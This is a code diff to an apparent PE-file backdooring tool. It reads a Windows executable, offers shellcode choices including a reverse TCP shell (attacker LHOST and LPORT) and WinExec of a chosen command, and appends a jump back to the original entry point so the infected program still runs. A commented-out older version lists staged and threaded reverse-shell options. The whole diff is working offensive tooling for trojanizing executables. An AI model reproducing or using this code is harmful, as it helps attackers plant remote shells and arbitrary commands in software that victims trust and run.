@@ -50,49 +50,45 @@ def menu():
     HexContent = LibByteEditor.GetHexFromFile(inputfile)
     PeInput = LibPeAnnalyzer.Extract(HexContent)
 
+    if PeInput.Optionalpeheader.signature == "020b":
+            print(Color.RED + "!!" + Color.RESET + "Your file is a " + Color.YELLOW + "X64" + Color.RESET + " beware to pick a " + Color.YELLOW + "X64" + Color.RESET + " shellcode " + Color.RED + "!!")
+    elif PeInput.Optionalpeheader.signature == "010b":
+            print(Color.RED + "!!" + Color.RESET + "Your file is a " + Color.YELLOW + "X32" + Color.RESET + " beware to pick a " + Color.YELLOW + "X32" + Color.RESET + " shellcode " + Color.RED + "!!")
+
     print(
         Color.GREEN + "It's time to generate a " + Color.RED + "shellcode" + Color.RESET + "." +
         "\nHere's a list of options :"
     )
 
     shellcodes = []
-    for (dirpath, _, filenames) in os.walk("ASM/ShellCodes"):
+    for (dirpath, _, filenames) in os.walk("SHELLCODES"):
         for file in filenames:
-            if "dev" not in dirpath.split("\\") :
-                shellcodes.append((dirpath+"/"+file).replace("\\","/").replace("ASM/ShellCodes/", "").split(".")[0])
+            shellcodes.append((dirpath+"/"+file).replace("\\","/").replace("ASM/ShellCodes/", "").split(".")[0])
 
     case = []
     for i in range(0, len(shellcodes)):
-        if shellcodes[i].split("/")[1] == Env.ARCH:
-            case += str(i)
-            print("     " + Color.GREEN + str(i) +
-                Color.RESET + " - " + shellcodes[i])
+        case += str(i)
+        print("     " + Color.GREEN + str(i) + Color.RESET + " - " + shellcodes[i].replace("SHELLCODES/",""))
 
     value = input("Select one shellcode : ")
     shellcode = LibShellcode.SHELLCODE()
+    shellcode = LibShellcode.ReadSHELLCODE(shellcodes[int(value)])
     if value in case:
-        LibDebug.Log("SUCCESS", shellcodes[int(
-            value)] + " successfuly loaded.")
+        LibDebug.Log("SUCCESS", shellcodes[int(value)] + " successfuly loaded.")
         LibDebug.Log("WORK", "Generating the shellcode..")
-        selection = shellcodes[int(value)].replace("Windows/" + Env.ARCH + "/","")
+        selection = shellcodes[int(value)].replace("SHELLCODES/","")
         try:
-            if selection == "Custom_Dynamic_ReverseTCP_Shell":
+            if "x32_Custom_Dynamic_WinExec" in selection:
                 print("Please enter your " + Color.YELLOW +
-                              " LHOST IP " + Color.RESET + " : ", end="")
-                LHOST = input()
-                print("Please enter your " + Color.YELLOW +
-                              " LPORT " + Color.RESET + " : ", end="")
-                LPORT = input()
-                shellcode = LibShellcode.GenerateCDRTShell(LHOST, LPORT)
-            elif selection == "Custom_Dynamic_ReverseTCP_Staged":
-                shellcode = LibShellcode.GenerateCDRTS()
-            elif selection == "Custom_Dynamic_ReverseTCP_Threaded_Shell":
-                shellcode = LibShellcode.GenerateCDRTTShell()
-            elif selection == "Custom_Dynamic_WinExec":
-                print("Please enter your " + Color.YELLOW +
-                            " COMMAND " + Color.RESET + " : ", end="")
+                " COMMAND " + Color.RESET + " : ", end="")
                 CMD = input()
-                shellcode = LibShellcode.GenerateWinExec(CMD)
+                shellcode = LibShellcode.EditWinexec(shellcode, CMD)
+            elif "x32_Custom_Dynamic_ReverseTCP_Shell" in selection:
+                print("Please enter your " + Color.YELLOW + " LHOST IP " + Color.RESET + " : ", end="")
+                LHOST = input()
+                print("Please enter your " + Color.YELLOW + " LPORT " + Color.RESET + " : ", end="")
+                LPORT = input()
+                shellcode = LibShellcode.EditCDRTSX32(shellcode, LHOST, LPORT)
         except:
             LibDebug.Log(
                 "ERROR", "Something went wrong with the generation. Exiting.")
@@ -101,9 +97,57 @@ def menu():
         LibDebug.Log("ERROR", "Bad entry. Exiting.")
         exit()
 
+    #ANCIENNE GENERATION AVEC NASM
+    # shellcodes = []
+    # for (dirpath, _, filenames) in os.walk("ASM/ShellCodes"):
+    #     for file in filenames:
+    #         if "dev" not in dirpath.split("\\") :
+    #             shellcodes.append((dirpath+"/"+file).replace("\\","/").replace("ASM/ShellCodes/", "").split(".")[0])
+
+    # case = []
+    # for i in range(0, len(shellcodes)):
+    #     if shellcodes[i].split("/")[1] == Env.ARCH:
+    #         case += str(i)
+    #         print("     " + Color.GREEN + str(i) +
+    #             Color.RESET + " - " + shellcodes[i])
+
+    # value = input("Select one shellcode : ")
+    # shellcode = LibShellcode.SHELLCODE()
+    # if value in case:
+    #     LibDebug.Log("SUCCESS", shellcodes[int(
+    #         value)] + " successfuly loaded.")
+    #     LibDebug.Log("WORK", "Generating the shellcode..")
+    #     selection = shellcodes[int(value)].replace("Windows/" + Env.ARCH + "/","")
+    #     try:
+    #         if selection == "Custom_Dynamic_ReverseTCP_Shell":
+    #             print("Please enter your " + Color.YELLOW +
+    #                           " LHOST IP " + Color.RESET + " : ", end="")
+    #             LHOST = input()
+    #             print("Please enter your " + Color.YELLOW +
+    #                           " LPORT " + Color.RESET + " : ", end="")
+    #             LPORT = input()
+    #             shellcode = LibShellcode.GenerateCDRTShell(LHOST, LPORT)
+    #         elif selection == "Custom_Dynamic_ReverseTCP_Staged":
+    #             shellcode = LibShellcode.GenerateCDRTS()
+    #         elif selection == "Custom_Dynamic_ReverseTCP_Threaded_Shell":
+    #             shellcode = LibShellcode.GenerateCDRTTShell()
+    #         elif selection == "Custom_Dynamic_WinExec":
+    #             print("Please enter your " + Color.YELLOW +
+    #                         " COMMAND " + Color.RESET + " : ", end="")
+    #             CMD = input()
+    #             shellcode = LibShellcode.GenerateWinExec(CMD)
+    #     except:
+    #         LibDebug.Log(
+    #             "ERROR", "Something went wrong with the generation. Exiting.")
+    #         exit()
+    # else:
+    #     LibDebug.Log("ERROR", "Bad entry. Exiting.")
+    #     exit()
+
     newjump = str(hex(int(LibByteEditor.RevertBytes(PeInput.Optionalpeheader.addressofentrypoint), 16)
                       + int(LibByteEditor.RevertBytes(PeInput.Optionalpeheader.imagebase), 16)))[2:]
     shellcode = shellcode.GetShellcode()
+
     shellcode += "B8" + newjump + "FFE0"
     LibDebug.Log("SUCCESS", "Shellcode successfully generated.")
 
